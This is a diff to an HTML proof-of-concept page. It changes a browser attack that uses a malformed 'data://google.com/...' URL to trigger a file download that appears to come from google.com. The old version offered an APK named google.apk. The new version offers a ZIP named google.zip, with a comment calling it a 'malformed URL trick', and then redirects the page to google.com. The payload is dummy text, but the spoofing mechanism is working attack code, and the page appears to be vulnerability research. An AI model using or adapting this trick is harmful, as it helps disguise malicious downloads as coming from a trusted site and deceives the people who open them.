@@ -2,42 +2,40 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Malformed Data URL PoC</title>
+  <title>ZIP Download with Origin PoC</title>
 </head>
 <body>
 
-<h3>Press the button to start download PoC</h3>
-<button id="start">Start PoC</button>
+<h3>ZIP Download with Spoofed Origin</h3>
+<button id="start">Start</button>
 
 <script>
 document.getElementById('start').addEventListener('click', () => {
   try {
-    // Dummy base64 content
-    const base64 = "ZXN0dGVzdGVzdA=="; // "esttesttest" dalam base64
+    // small base64 dummy
+    const content = "PK\nFake ZIP\nHello Android\nEND";
+    const base64 = btoa(content);
 
-    // Malformed data URL
-    const payload = "data://google.com/application/vnd.android.package-archive;base64," + base64;
+    // ⚠️ key: malformed URL trick
+    const payload = "data://google.com/application/zip;base64," + base64;
 
-    // Cara 1: langsung navigate (kalau browser masih vulnerable)
-    try {
-      location.href = payload;
-      console.log("Navigation attempted via location.href");
-    } catch (e) {
-      console.warn("Navigation blocked, fallback to link:", e);
-    }
-
-    // Cara 2: fallback via <a> click (harus user gesture)
+    // trigger download
     const a = document.createElement('a');
     a.href = payload;
-    a.download = "google.apk";
+    a.download = "google.zip";
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
 
-    console.log("Download triggered via <a> click");
+    console.log("ZIP download triggered with spoofed origin");
 
-  } catch (err) {
-    console.error("PoC failed:", err);
+    // redirect after download
+    setTimeout(() => {
+      location.href = "https://google.com";
+    }, 500);
+
+  } catch(e) {
+    console.error(e);
   }
 });
 </script>
